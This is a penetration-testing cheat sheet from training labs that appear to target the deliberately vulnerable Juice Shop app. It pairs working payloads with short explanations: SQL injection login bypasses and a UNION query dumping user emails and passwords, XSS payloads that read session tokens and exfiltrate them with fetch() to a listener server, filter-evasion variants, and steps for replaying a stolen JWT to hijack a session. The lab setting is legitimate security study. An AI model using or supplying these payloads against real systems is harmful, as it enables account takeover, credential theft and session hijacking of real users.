SQL Injection (Lab 03)

Payload / Command Action How it works Source
' OR 1=1--
Auth bypass in login (first row) Quote closes the string, OR 1=1 is always true, -- comments out the password check Lab 03
' OR 1=1 LIMIT 1 OFFSET 1--
Pagination user traversal (2nd, 3rd user...) LIMIT 1 OFFSET N skips the first N rows returned by OR 1=1 so you can log into every account one by one without knowing their email Lab 03
q=')
Error probe (is it injectable?) Input here sits in nested parens, so ') breaks the query where a lone quote returns an empty 200. A SQL error back means input reaches the DB unfiltered Lab 03

x')) UNION SELECT email,password,'3','4','5','6','7','8','9' FROM Users--

Cross-Site Scripting / XSS (Lab 04)

Payload / Command Action How it works Source
<img src=x onerror=alert(document.domain)>
Prove XSS (DOM, reflected or stored) The image source x fails to load, so onerror fires your JS. Works inside innerHTML sinks (where browsers ignore <script>) or when <script> is filtered Lab 04
<img src=x onerror="alert(localStorage.getItem('token'))">
Read the session token Juice Shop stores the JWT in localStorage and a non-HttpOnly cookie, so JavaScript can read both Lab 04
<img src=x onerror="fetch('http://localhost:9000/?token='+localStorage.getItem('token'))">
Exfil the token silently Ships the victim's token in the background to a server you control with no popup on their screen. On a real job that host is your VPS or Burp Collaborator Lab 04
<img src=x onerror="fetch('/rest/user/whoami').then(r=>r.text()).then(d=>fetch('http://localhost:9000/?whoami='+encodeURIComponent(d)))">
Defeat HttpOnly via same-origin fetch() Even if a cookie is HttpOnly, the browser attaches it automatically to same-origin requests, so XSS can call internal APIs as the victim Lab 04
<img/src="x"/onerror=alert`1`>
WAF bypass (no spaces, no parens) HTML5 treats / after a tag name or quoted attribute ("x"/) as whitespace; ES6 template literals call functions with `1` instead of (1) Lab 04
<details/open/ontoggle=alert(localStorage.token)>
Quote-free + space-free token read Uses boolean open (no quotes needed before /) and localStorage.token dot-notation to read the JWT with zero quotes and zero spaces Lab 04
python3 -m http.server 9000
Start the exfil listener A one-line web server on your own machine. Watch its log for a GET /?token=eyJ... line with the stolen token attached Lab 04
localStorage.setItem('token', '<JWT>'); document.cookie = 'token=<JWT>';
Hijack: replay a stolen session Run in an Incognito Console, paste the stolen JWT into both localStorage and document.cookie, and reload. Logs you in as the victim with no password Lab 04
<script>alert(1)</script>
Reflected / stored, HTML context The classic solve when your input lands in HTML on a full page load. If injected via innerHTML in an SPA, use the onerror image above instead Lab 04
" autofocus onfocus=alert(document.domain) x="
Attribute-context breakout When angle brackets are encoded you can't open a tag. The unencoded double quote closes value=" so you attach autofocus onfocus onto the existing input tag Lab 04

State / Sequence Kernel Response Deducted State Pentester Exploitation / Operational Reality Source

TCP vs. UDP Stateful vs Stateless L4 TRADE-OFF TCP guarantees delivery for reverse shells; UDP allows spoofed traffic but is silent when open. Lab 01
